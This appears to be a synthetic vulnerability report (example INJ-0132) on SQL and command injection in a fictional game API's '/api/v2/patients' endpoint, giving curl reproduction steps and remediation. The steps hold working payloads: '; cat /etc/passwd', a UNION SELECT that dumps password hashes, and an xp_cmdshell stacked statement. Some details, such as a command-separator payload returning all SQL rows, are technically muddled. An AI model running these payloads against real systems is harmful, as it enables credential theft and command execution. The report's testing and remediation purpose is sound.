## System

- System: RealmForge Game API v3.4.0
- Domain: GAMING / MMO BACKEND
- Example ID: INJ-0132
- Risk ID: RISK-INJ-132
- Vulnerability: Command Injection (CMDi) — also exhibits SQLi characteristics

## Findings

### 1. Injection on `/api/v2/patients?name=` (HAR Primary)

**HAR evidence**: `GET /api/v2/patients?name=;%20cat%20/etc/passwd` → HTTP 200 with all user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`, `username: "user2"`, `password_hash: "$2b$12$abc"`.

**Context inconsistency**: Section 1.0 declares CMDi and Section 4.0 uses an OS command separator payload (`; cat /etc/passwd`), but Section 3.0 shows raw SQL string concatenation (`SELECT * FROM patients WHERE name = '${req.query.name}'`). The HAR response contains SQL-structured user record data — indicating the primary active vulnerability is SQL Injection (SQLi). The CMDi payload `; cat /etc/passwd` also terminates the SQL string, causing a WHERE clause that returns all rows. Section 6.0 confirms `db_owner` privileges, making DDL and data exfiltration possible via SQLi. Both vectors are demonstrated below.

**Root cause**: `SELECT * FROM patients WHERE name = '${req.query.name}'` — raw string concatenation with no parameterization. No WAF or input validation on this legacy endpoint (Section 6.0, RISK-INJ-132). Application connects as `db_owner`.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.realmforge-game.example.com/api/v2/patients?name=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: Returns matching records only.

**Step 2 — SQLi via CMDi-style payload (primary HAR attack):**

```bash
curl -s "https://api.realmforge-game.example.com/api/v2/patients?name=;%20cat%20/etc/passwd" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected secure: 400 Bad Request / 0 results / sanitized error.  
Expected vulnerable: HTTP 200 — all user records returned including admin password hashes (`$2b$12$secret`) and roles.

**Step 3 — SQLi data exfiltration with UNION (db_owner):**

```bash
curl -s "https://api.realmforge-game.example.com/api/v2/patients?name=' UNION SELECT username,password_hash,role FROM users--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: Returns credential dump from `users` table via UNION.

**Step 4 — CMDi via stacked statement (if server executes OS commands):**

```bash
curl -s "https://api.realmforge-game.example.com/api/v2/patients?name='; exec xp_cmdshell('id')--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: OS command output returned (e.g., `nt authority\system`).

**Step 5 — Verbose error confirmation:**

```bash
curl -s "https://api.realmforge-game.example.com/api/v2/patients?name='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected (if misconfigured): SQL syntax error leaking table name, column names, or DB version.

## Evidence

- **HAR**: `GET /api/v2/patients?name=;%20cat%20/etc/passwd` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
- **Section 3.0 (RISK-INJ-132)**: raw SQL string concatenation — `SELECT * FROM patients WHERE name = '${req.query.name}'`.
- **Section 4.0**: payload `; cat /etc/passwd` — OS command separator / SQL terminator.
- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.

## Remediation

- **Parameterized queries**: replace `${req.query.name}` with `?` or named parameters (`SELECT * FROM patients WHERE name = $1`).
- **Restrict DB account**: application account must use least-privilege (SELECT only on required tables, no DDL).
- **Disable verbose error messages in production**.
- **Input validation middleware**: reject inputs containing SQL metacharacters (`'`, `;`, `--`, `/*`) and OS command separators.
- **ORM migration**: complete migration of `/api/v2/patients` to parameterized ORM queries (RISK-INJ-132 remediation).
